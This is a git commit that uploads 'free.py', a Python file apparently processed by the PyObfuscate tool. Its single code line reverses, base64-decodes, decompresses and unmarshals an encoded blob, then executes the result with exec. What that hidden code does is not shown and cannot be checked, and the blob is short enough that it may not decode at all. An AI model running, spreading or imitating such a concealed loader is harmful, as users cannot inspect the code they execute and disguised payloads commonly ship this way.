e349236870517674dc956e2716f04e392bd4358f
COOL-ROOM-368 <147789027+COOL-ROOM-368@users.noreply.github.com>
2023-11-15 19:37:45 +0630

    Add files via upload

---
+++ free.py
@@ -0,0 +1,5 @@
+# Obfuscated with PyObfuscate
+# https://www.github.com/htr-tech
+# Time : Wed Nov 15 19:31:31 2023
+# -------------------------------
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'11BGKBQFAxaRDBmLkgxNMyIjM/QiCs8FQMCGganI7SFnSTJ/cvpDv0dhNN7F+j0MhLpuSTAWtB5CWk+kPR9r1cTyf/c3LiXyrSiE8nMoMThwQiMyFjxyQOMmCDpwQ6MmQCxs6DFTCAkZLxJe'))
